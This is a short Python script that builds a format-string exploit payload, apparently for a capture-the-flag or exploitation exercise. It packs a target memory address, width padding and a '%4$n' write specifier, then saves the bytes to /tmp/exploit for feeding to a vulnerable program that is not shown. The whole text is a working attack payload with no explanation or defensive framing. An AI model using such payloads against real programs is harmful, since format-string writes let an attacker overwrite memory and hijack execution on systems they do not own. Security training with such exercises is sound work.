payload = b"\x8c\x98\x04\x08"
payload += b"%60x"
payload += b"%4$n"

with open('/tmp/exploit', 'wb') as f:
    f.write(payload)
